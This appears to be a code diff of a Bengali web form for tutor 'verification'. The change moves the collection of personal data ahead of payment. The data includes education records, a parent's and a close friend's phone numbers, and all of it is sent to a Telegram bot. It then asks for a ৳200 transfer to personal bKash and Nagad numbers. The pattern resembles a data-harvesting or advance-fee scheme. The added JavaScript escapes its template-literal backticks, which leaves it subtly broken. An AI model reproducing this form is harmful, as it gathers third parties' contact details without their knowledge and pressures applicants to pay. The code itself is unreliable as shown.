@@ -939,74 +939,86 @@
 
   <div class="form-container">
 
+    <!-- STEP 1: Personal data -->
     <div class="form-step active" id="step1">
-      <div class="step-badge">ধাপ ১ — Payment যাচাই</div>
+      <div class="step-badge">ধাপ ১ — আপনার তথ্য</div>
 
       <div class="form-group">
         <label class="form-label">নাম *</label>
-        <input class="form-input" id="s1-name" type="text" placeholder="আপনার পুরো নাম" />
+        <input class="form-input" id="s1-name" type="text" placeholder="পুরো নাম" />
       </div>
       <div class="form-group">
         <label class="form-label">নম্বর (WhatsApp) *</label>
         <input class="form-input" id="s1-phone" type="tel" placeholder="01XXXXXXXXX" />
       </div>
       <div class="form-group">
-        <label class="form-label">Transaction ID *</label>
-        <input class="form-input" id="s1-txn" type="text" placeholder="Payment-এর Transaction ID" />
+        <label class="form-label">স্কুল</label>
+        <input class="form-input" id="s1-school" type="text" placeholder="স্কুলের নাম" />
+      </div>
+      <div class="form-group">
+        <label class="form-label">কলেজ</label>
+        <input class="form-input" id="s1-college" type="text" placeholder="কলেজের নাম" />
+      </div>
+      <div class="form-group">
+        <label class="form-label">SSC Result</label>
+        <input class="form-input" id="s1-ssc" type="text" placeholder="যেমন: GPA 5.00" />
+      </div>
+      <div class="form-group">
+        <label class="form-label">HSC Result</label>
+        <input class="form-input" id="s1-hsc" type="text" placeholder="যেমন: GPA 5.00" />
+      </div>
+      <div class="form-group">
+        <label class="form-label">বিশ্ববিদ্যালয়</label>
+        <input class="form-input" id="s1-uni" type="text" placeholder="বিশ্ববিদ্যালয়ের নাম" />
+      </div>
+      <div class="form-group">
+        <label class="form-label">বিষয় (Subject)</label>
+        <input class="form-input" id="s1-subject" type="text" placeholder="যে বিষয় পড়াতে চান" />
+      </div>
+      <div class="form-group">
+        <label class="form-label">CGPA</label>
+        <input class="form-input" id="s1-cgpa" type="text" placeholder="বর্তমান CGPA" />
+      </div>
+      <div class="form-group">
+        <label class="form-label">অভিভাবকের নাম</label>
+        <input class="form-input" id="s1-pname" type="text" placeholder="বাবা / মায়ের নাম" />
+      </div>
+      <div class="form-group">
+        <label class="form-label">অভিভাবকের ফোন নম্বর</label>
+        <input class="form-input" id="s1-pphone" type="tel" placeholder="অভিভাবকের নম্বর" />
+      </div>
+      <div class="form-group">
+        <label class="form-label">কাছের বন্ধুর ফোন নম্বর</label>
+        <input class="form-input" id="s1-friend" type="tel" placeholder="বন্ধুর নম্বর" />
       </div>
 
       <button class="submit-btn" id="btn1" onclick="submitStep1()">
-        <span id="btn1Text">পরবর্তী ধাপ →</span>
+        <span id="btn1Text">পরবর্তী ধাপ — Payment →</span>
         <span id="btn1Spinner" class="spinner" style="display:none"></span>
       </button>
     </div>
 
+    <!-- STEP 2: Payment -->
     <div class="form-step" id="step2">
-      <div class="step-badge">ধাপ ২ — আপনার তথ্য</div>
+      <div class="step-badge">ধাপ ২ — Payment যাচাই</div>
+
+      <div style="background:rgba(201,168,76,0.08);border:1.5px solid rgba(201,168,76,0.35);border-radius:12px;padding:18px 20px;text-align:center;">
+        <p style="font-size:0.9rem;color:var(--text-muted);margin-bottom:10px;">নিচের যেকোনো একটি নম্বরে <strong style="color:var(--gold-light)">৳২০০</strong> Send Money করুন</p>
+        <div style="display:flex;gap:12px;justify-content:center;flex-wrap:wrap;">
+          <div style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:10px 18px;">
+            <div style="font-size:0.7rem;text-transform:uppercase;letter-spacing:0.1em;color:var(--gold);font-weight:700;margin-bottom:3px;">bKash</div>
+            <div style="font-size:1rem;font-weight:600;color:var(--text);">01633410212</div>
+          </div>
+          <div style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:10px 18px;">
+            <div style="font-size:0.7rem;text-transform:uppercase;letter-spacing:0.1em;color:var(--gold);font-weight:700;margin-bottom:3px;">Nagad</div>
+            <div style="font-size:1rem;font-weight:600;color:var(--text);">01846156788</div>
+          </div>
+        </div>
+      </div>
 
       <div class="form-group">
-        <label class="form-label">নাম</label>
-        <input class="form-input" id="s2-name" type="text" placeholder="পুরো নাম" />
-      </div>
-      <div class="form-group">
-        <label class="form-label">স্কুল</label>
-        <input class="form-input" id="s2-school" type="text" placeholder="স্কুলের নাম" />
-      </div>
-      <div class="form-group">
-        <label class="form-label">কলেজ</label>
-        <input class="form-input" id="s2-college" type="text" placeholder="কলেজের নাম" />
-      </div>
-      <div class="form-group">
-        <label class="form-label">SSC Result</label>
-        <input class="form-input" id="s2-ssc" type="text" placeholder="যেমন: GPA 5.00" />
-      </div>
-      <div class="form-group">
-        <label class="form-label">HSC Result</label>
-        <input class="form-input" id="s2-hsc" type="text" placeholder="যেমন: GPA 5.00" />
-      </div>
-      <div class="form-group">
-        <label class="form-label">বিশ্ববিদ্যালয়</label>
-        <input class="form-input" id="s2-uni" type="text" placeholder="বিশ্ববিদ্যালয়ের নাম" />
-      </div>
-      <div class="form-group">
-        <label class="form-label">বিষয় (Subject)</label>
-        <input class="form-input" id="s2-subject" type="text" placeholder="যে বিষয় পড়াতে চান" />
-      </div>
-      <div class="form-group">
-        <label class="form-label">CGPA</label>
-        <input class="form-input" id="s2-cgpa" type="text" placeholder="বর্তমান CGPA" />
-      </div>
-      <div class="form-group">
-        <label class="form-label">অভিভাবকের নাম</label>
-        <input class="form-input" id="s2-pname" type="text" placeholder="বাবা / মায়ের নাম" />
-      </div>
-      <div class="form-group">
-        <label class="form-label">অভিভাবকের ফোন নম্বর</label>
-        <input class="form-input" id="s2-pphone" type="tel" placeholder="অভিভাবকের নম্বর" />
-      </div>
-      <div class="form-group">
-        <label class="form-label">কাছের বন্ধুর ফোন নম্বর</label>
-        <input class="form-input" id="s2-friend" type="tel" placeholder="বন্ধুর নম্বর" />
+        <label class="form-label">Transaction ID *</label>
+        <input class="form-input" id="s2-txn" type="text" placeholder="Payment-এর Transaction ID" />
       </div>
 
       <button class="submit-btn" id="btn2" onclick="submitStep2()">
@@ -1159,12 +1171,11 @@
   }
 
   async function submitStep1() {
-    const name = document.getElementById('s1-name').value.trim();
+    const name  = document.getElementById('s1-name').value.trim();
     const phone = document.getElementById('s1-phone').value.trim();
-    const txn  = document.getElementById('s1-txn').value.trim();
 
-    if (!name || !phone || !txn) {
-      showToast('সব তথ্য পূরণ করুন।', 'warning', 3000);
+    if (!name || !phone) {
+      showToast('নাম ও নম্বর অবশ্যই দিন।', 'warning', 3000);
       return;
     }
 
@@ -1173,52 +1184,61 @@
     document.getElementById('btn1Spinner').style.display = 'inline-block';
     btn.disabled = true;
 
-    await sendToTelegram(
-`📩 *Verification — ধাপ ১ (Payment)*
+    const school  = document.getElementById('s1-school').value.trim();
+    const college = document.getElementById('s1-college').value.trim();
+    const ssc     = document.getElementById('s1-ssc').value.trim();
+    const hsc     = document.getElementById('s1-hsc').value.trim();
+    const uni     = document.getElementById('s1-uni').value.trim();
+    const subject = document.getElementById('s1-subject').value.trim();
+    const cgpa    = document.getElementById('s1-cgpa').value.trim();
+    const pname   = document.getElementById('s1-pname').value.trim();
+    const pphone  = document.getElementById('s1-pphone').value.trim();
+    const friend  = document.getElementById('s1-friend').value.trim();
 
-👤 নাম: ${name}
-📱 নম্বর: ${phone}
-🔖 Transaction ID: ${txn}`
+    await sendToTelegram(
+\`📋 *Verification — ধাপ ১ (ব্যক্তিগত তথ্য)*
+
+👤 নাম: \${name}
+📱 নম্বর: \${phone}
+🏫 স্কুল: \${school || '—'}
+🎓 কলেজ: \${college || '—'}
+📊 SSC Result: \${ssc || '—'}
+📊 HSC Result: \${hsc || '—'}
+🏛️ বিশ্ববিদ্যালয়: \${uni || '—'}
+📚 বিষয়: \${subject || '—'}
+🔢 CGPA: \${cgpa || '—'}
+👨‍👩 অভিভাবক: \${pname || '—'}
+📞 অভিভাবকের নম্বর: \${pphone || '—'}
+👫 বন্ধুর নম্বর: \${friend || '—'}\`
     );
 
-    document.getElementById('s2-name').value = name;
     document.getElementById('step1').classList.remove('active');
     document.getElementById('step2').classList.add('active');
     window.scrollTo({ top: document.getElementById('formSection').offsetTop - 20, behavior: 'smooth' });
   }
 
   async function submitStep2() {
-    const name    = document.getElementById('s2-name').value.trim();
-    const school  = document.getElementById('s2-school').value.trim();
-    const college = document.getElementById('s2-college').value.trim();
-    const ssc     = document.getElementById('s2-ssc').value.trim();
-    const hsc     = document.getElementById('s2-hsc').value.trim();
-    const uni     = document.getElementById('s2-uni').value.trim();
-    const subject = document.getElementById('s2-subject').value.trim();
-    const cgpa    = document.getElementById('s2-cgpa').value.trim();
-    const pname   = document.getElementById('s2-pname').value.trim();
-    const pphone  = document.getElementById('s2-pphone').value.trim();
-    const friend  = document.getElementById('s2-friend').value.trim();
+    const txn = document.getElementById('s2-txn').value.trim();
+
+    if (!txn) {
+      showToast('Transaction ID দিন।', 'warning', 3000);
+      return;
+    }
 
     const btn = document.getElementById('btn2');
     document.getElementById('btn2Text').style.display = 'none';
     document.getElementById('btn2Spinner').style.display = 'inline-block';
     btn.disabled = true;
 
-    await sendToTelegram(
-`📋 *Verification — ধাপ ২ (পূর্ণ প্রোফাইল)*
+    const name  = document.getElementById('s1-name').value.trim();
+    const phone = document.getElementById('s1-phone').value.trim();
 
-👤 নাম: ${name || '—'}
-🏫 স্কুল: ${school || '—'}
-🎓 কলেজ: ${college || '—'}
-📊 SSC Result: ${ssc || '—'}
-📊 HSC Result: ${hsc || '—'}
-🏛️ বিশ্ববিদ্যালয়: ${uni || '—'}
-📚 বিষয়: ${subject || '—'}
-🔢 CGPA: ${cgpa || '—'}
-👨‍👩 অভিভাবক: ${pname || '—'}
-📞 অভিভাবকের নম্বর: ${pphone || '—'}
-👫 বন্ধুর নম্বর: ${friend || '—'}`
+    await sendToTelegram(
+\`💳 *Verification — ধাপ ২ (Payment)*
+
+👤 নাম: \${name}
+📱 নম্বর: \${phone}
+🔖 Transaction ID: \${txn}\`
     );
 
     document.getElementById('step2').classList.remove('active');
